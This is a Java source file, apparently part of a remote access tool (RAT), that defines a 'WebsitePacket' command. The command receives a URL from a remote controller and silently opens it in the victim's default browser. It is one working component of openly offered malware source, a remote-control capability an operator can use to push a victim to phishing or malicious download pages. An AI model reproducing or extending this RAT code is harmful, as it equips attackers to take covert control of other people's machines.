package de.sogomn.rat.packet;

import java.awt.Desktop;
import java.awt.Desktop.Action;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

import de.sogomn.rat.ActiveConnection;

public final class WebsitePacket implements IPacket {
	
	private String address;
	
	private static final String HTTP_PREFIX = "http://";
	
	public WebsitePacket(final String address) {
		final boolean hasPrefix = address.startsWith(HTTP_PREFIX);
		
		if (hasPrefix) {
			this.address = address;
		} else {
			this.address = HTTP_PREFIX + address;
		}
	}
	
	public WebsitePacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(address);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		address = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final boolean desktopSupported = Desktop.isDesktopSupported();
		
		if (desktopSupported) {
			final Desktop desktop = Desktop.getDesktop();
			final boolean canBrowse = desktop.isSupported(Action.BROWSE);
			
			if (canBrowse) {
				try {
					final URI uri = new URI(address);
					
					desktop.browse(uri);
				} catch (final IOException | URISyntaxException ex) {
					ex.printStackTrace();
				}
			}
		}
	}
	
	public String getAddress() {
		return address;
	}
	
}
